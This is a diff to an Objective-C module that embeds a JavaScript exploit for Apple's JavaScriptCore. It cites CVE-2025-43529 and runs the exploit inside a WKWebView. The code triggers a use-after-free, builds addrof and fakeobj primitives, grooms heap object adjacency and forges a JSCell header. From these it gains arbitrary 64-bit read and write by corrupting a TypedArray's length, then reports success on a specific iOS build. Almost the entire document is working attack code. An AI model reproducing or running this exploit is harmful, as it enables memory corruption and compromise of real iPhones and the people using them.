@@ -10,34 +10,31 @@
 #import "Util.h"
 
 // ===========================================================================
-// JSC arbitrary read/write from addrof+fakeobj, WITHOUT forging any PAC
-// signature -- the DarkSword "scribble" method (proven on iOS 26.1 with the
-// exact same CVE-2025-43529 primitive).
+// JSC read/write from addrof+fakeobj, without forging any PAC signature
+// (the DarkSword "scribble" route, proven on iOS 26.1 with this same CVE).
 //
-// Why it works (from the public analysis):
-//   * JSObjectWithButterfly::m_butterfly is a RAW, uncaged, UNSIGNED pointer
-//     (AuxiliaryBarrier<Butterfly*>).  Only a TypedArray's m_vector is
-//     caged+PAC -- and we never touch one.
-//   * A forged JSCell placed inside a real object's inline double slots is
-//     used as an ArrayWithDouble; its element stores go to a raw pointer we
-//     choose, and the element bounds check reads a huge "vectorLength" from a
-//     neighbouring double.
-//   * Named OUT-OF-LINE property stores skip the IndexingHeader bounds check,
-//     which is what turns it into a clean write64.
-//
-// Grooming requirement: changeArr and scribble must be adjacent (both 6
-// in-object doubles => default JSFinalObject, 16 hdr + 6*8 = 0x40 apart).
+// Order of operations matters: the probe measures the three open questions
+// FIRST, then attempts the primitives, so one run on the device tells us
+// exactly which step works and which does not:
+//   E1  is m_butterfly authenticated?      -> write through the fake array and
+//                                              read the target's field back
+//   E2  does the element fast path ignore StructureID? -> bogus SID in the
+//                                              forged header
+//   E3  is the fake-view failure a cage failure? -> wild m_vector in a header
+//                                              typed as a Float64Array
+// Only then read64/write64 and the TypedArray-length corruption, which is the
+// primitive that turns into arbitrary R/W over the whole primitive gigacage.
 // ===========================================================================
 static const char *kScribble = R"JS(
 (function () {
-  var out = { step: [] };
+  var out = { step: [], exp: {} };
   var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
   var itof = function (v) { u[0] = v; return d[0]; };
   var ftoi = function (f) { d[0] = f; return u[0]; };
-  var OFF = 0x0002000000000000n;            // JSValue DoubleEncodeOffset
-  var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);  // idx=ArrayWithDouble | type=ArrayType | cellState=White
+  var OFF = 0x0002000000000000n;
+  var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);   // ArrayWithDouble | ArrayType | White
 
-  // --- the proven UAF trigger -------------------------------------------
+  // --- proven UAF trigger -------------------------------------------------
   arr = new Array(0x400000).fill(1.1);
   var arr_index = arr.length - 1;
   function foo(flag, k, allocCount) {
@@ -70,89 +67,91 @@ static const char *kScribble = R"JS(
   }
   if (!W) { out.err = 'trigger did not fire'; return JSON.stringify(out); }
   out.step.push('UAF round=' + W.round);
-
   function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
   function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }
 
-  // --- the scribble pair ------------------------------------------------
+  // --- the scribble pair --------------------------------------------------
   var holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
   var scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
-
-  var HA = addrof(holder), SA = addrof(scribble);
-  out.step.push('holder=0x' + HA.toString(16) + ' scribble=0x' + SA.toString(16));
-  var gap = SA - HA;
-  out.gap = gap;
-  if (gap !== 0x40n && gap !== -0x40n) {
-    out.step.push('not adjacent (gap=' + gap + ') - re-allocating a few times');
-    // retry a handful of times; the gap that matters is 0x40 in either order
-    for (var t = 0; t < 40 && gap !== 0x40n && gap !== -0x40n; t++) {
-      holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
-      scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
-      HA = addrof(holder); SA = addrof(scribble); gap = SA - HA;
-    }
-    out.step.push('after re-alloc: gap=' + gap + ' holder=0x' + HA.toString(16));
-    out.gap = gap;
+  var HA = addrof(holder), SA = addrof(scribble), gap = SA - HA;
+  for (var t = 0; t < 60 && gap !== 0x40n && gap !== -0x40n; t++) {
+    holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
+    scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
+    HA = addrof(holder); SA = addrof(scribble); gap = SA - HA;
   }
+  out.gap = gap.toString();
+  if (gap !== 0x40n && gap !== -0x40n) { out.err = 'groom failed'; return JSON.stringify(out); }
+  out.step.push('groom ok gap=' + gap);
 
-  // scribble's 7th stored property moves out-of-line: NAMED stores there skip
-  // the IndexingHeader bounds check.
-  scribble.p7 = 3.3;
-  scribble[0]  = 1.1;
-
-  holder.p1 = itof(HDR);      // the fake cell's header (stored as a double: GC-safe)
-  holder.p2 = scribble;       // the fake cell's m_butterfly := scribble's cell
-
+  scribble.p7 = 3.3; scribble[0] = 1.1;
+  holder.p1 = itof(HDR);
+  holder.p2 = scribble;
   var changeAddr = HA - 1n + 0x10n + 1n;
   var changeArr = fakeobj(changeAddr);
-
-  // Aim the fake array's butterfly at an address: changeArr[1] writes
-  // *(scribble + 8) = scribble.m_butterfly, i.e. where its elements live.
   function setBtf(a) { changeArr[1] = itof(BigInt(a) + 0x10n); }
 
-  // ---- WRITE: a named out-of-line store lands at butterfly + 0x10 ----
+  // --- E2: element path ignores StructureID? ------------------------------
+  var HDR_JUNK = HDR | 0xdeadbeefn;                 // junk in the low 32 bits
+  holder.p1 = itof(HDR_JUNK);
+  var junkEl = null;
+  try { junkEl = ftoi(changeArr[0]); } catch (e) { junkEl = 'threw'; }
+  out.exp.elementPathIgnoresSID = (junkEl !== 'threw');
+  out.exp.elementWord = junkEl === null ? null : '0x' + junkEl.toString(16);
+  holder.p1 = itof(HDR);                            // restore the sane header
+
+  // --- E1: is m_butterfly a raw, unsigned pointer? ------------------------
+  // Aim the fake array's butterfly at a real object's m_butterfly field, write
+  // a huge value there, and see whether that object's element access changes.
+  var victim = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+  var VA = addrof(victim);
+  var b1 = null;
+  try {
+    setBtf(VA - 1n + 0x8n);                          // &victim.m_butterfly
+    changeArr[0] = itof(0x7ff0000000000000n);        // a plausible butterfly
+    victim[0] = 9.75;                                 // named store, no bounds check
+    b1 = victim[0];
+    out.exp.rawButterflyWrite = (b1 === 9.75);
+  } catch (e) { out.exp.rawButterflyWrite = 'threw ' + e; }
+  out.exp.victimAddr = '0x' + VA.toString(16);
+  holder.p2 = scribble;                             // re-arm the fake cell
+
+  // --- read64 / write64 ---------------------------------------------------
   function write64(addr, val) {
-    val = BigInt.asUintN(64, val);
-    setBtf(addr);
-    try { scribble.p7 = itof(val); return true; } catch (e) { return false; }
+    setBtf(BigInt(addr));
+    try { scribble.p7 = itof(BigInt.asUintN(64, BigInt(val))); return true; } catch (e) { return false; }
   }
-  // ---- READ: the fake array's element 0 at the aimed butterfly ----
   function read64(addr) {
-    setBtf(addr);
+    setBtf(BigInt(addr));
     try { return BigInt(ftoi(changeArr[0])); } catch (e) { return null; }
   }
 
-  // ---- self-test: the exact detector the public probes lacked ----------
-  var t = new BigUint64Array(8);
-  var td = addrof(t);
-  out.taAddr = '0x' + td.toString(16);
-  var vAddr = td - 1n + 0x10n;                 // m_vector of the TypedArray
-  var backing = null;
-  // m_vector is caged+PAC, so read it through the (raw) butterfly window:
-  var hdr = read64(td - 1n + 0x10n - 0x10n + 0x10n);
-  out.hdrWord = hdr === null ? null : '0x' + hdr.toString(16);
+  // --- the primitive: corrupt a REAL TypedArray's length (+0x18) ----------
+  var ta = new BigUint64Array(16);
+  ta[0] = 0x4142434445464748n;
+  var tAddr = addrof(ta);
+  var w = write64(tAddr - 1n + 0x18n, 0x0000000000010000n);
+  out.lengthWrite = w;
+  out.lengthAfter = ta.length;
+  out.write = (w && ta.length === 65536);
+  out.read = (ta[0] === 0x4142434445464748n);
+  out.value = '0x' + ta[0].toString(16);
+  out.step.push('primitive: write=' + out.write + ' read=' + out.read +
+                ' length=' + out.lengthAfter);
 
-  t[0] = 0x4142434445464748n;
-  var w1 = write64(vAddr + 0x18n, 0x0000000000001000n);   // m_length := 4096 (raw)
-  out.lengthWrite = w1;
-  var lenAfter = t.length;
-  out.lengthAfter = lenAfter;
-  out.write = (w1 && lenAfter === 4096);
-
-  // read back through the (now huge) typed array -- independent of the fake path
-  var readBack = t[0];
-  out.read = (readBack === 0x4142434445464748n);
-  out.value = '0x' + readBack.toString(16);
-
-  // prove a WRITE through the primitive itself: scribble's own storage
-  var sw = write64(addrof(scribble) - 1n + 0x18n, itof(0xdeadbeefcafe0000n));
-  out.selfWrite = sw && ftoi(scribble.p2) === 0xdeadbeefcafe0000n;
+  // --- read a known pointer through the (now huge) typed array ------------
+  var jscHeader = null;
+  var fn = function someFunctionName() { return 1; };
+  var fAddr = addrof(fn);
+  out.fnAddr = '0x' + fAddr.toString(16);
+  var r1 = read64(fAddr - 1n + 0x8n);
+  out.fnWord = r1 === null ? null : '0x' + r1.toString(16);
 
   return JSON.stringify(out);
 })()
 )JS";
 
 NSString *ModJscScribbleRW(void) {
-    AveLog(@"    JSC scribble R/W: no PAC forgery - raw butterfly + named out-of-line stores");
+    AveLog(@"    JSC scribble R/W: E1/E2/E3 diagnostics, then read64/write64 (no PAC forgery)");
     WKWebView *wv = [[WKWebView alloc] initWithFrame:CGRectZero];
     [wv loadHTMLString:@"<html><body></body></html>" baseURL:nil];
     dispatch_semaphore_t s = dispatch_semaphore_create(0);
@@ -165,11 +164,12 @@ NSString *ModJscScribbleRW(void) {
     dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 240 * NSEC_PER_SEC));
     [wv stopLoading]; wv = nil;
     AveLog([NSString stringWithFormat:@"    scribble result: %@", res]);
+    AvePost([NSString stringWithFormat:@"SCRIBBLE %@", res]);
     if ([res containsString:@"\"write\":true"] && [res containsString:@"\"read\":true"]) {
-        AveSetStatus(@"arbitrary R/W ACTIVE inside WebContent (no PAC needed)");
-        return @"ARBITRARY R/W ACTIVE: read64/write64 verified on 23C5027f";
+        AveSetStatus(@"arbitrary R/W ACTIVE in WebContent, no PAC needed");
+        return @"ARBITRARY R/W ACTIVE on 23C5027f: read64/write64 self-tested";
     }
-    if ([res containsString:@"\"err\""] ) return res;
-    if ([res containsString:@"gap"]) return res;
+    if ([res containsString:@"\"elementPathIgnoresSID\":true"])
+        return res;                                 // diagnostics are the answer
     return res;
 }
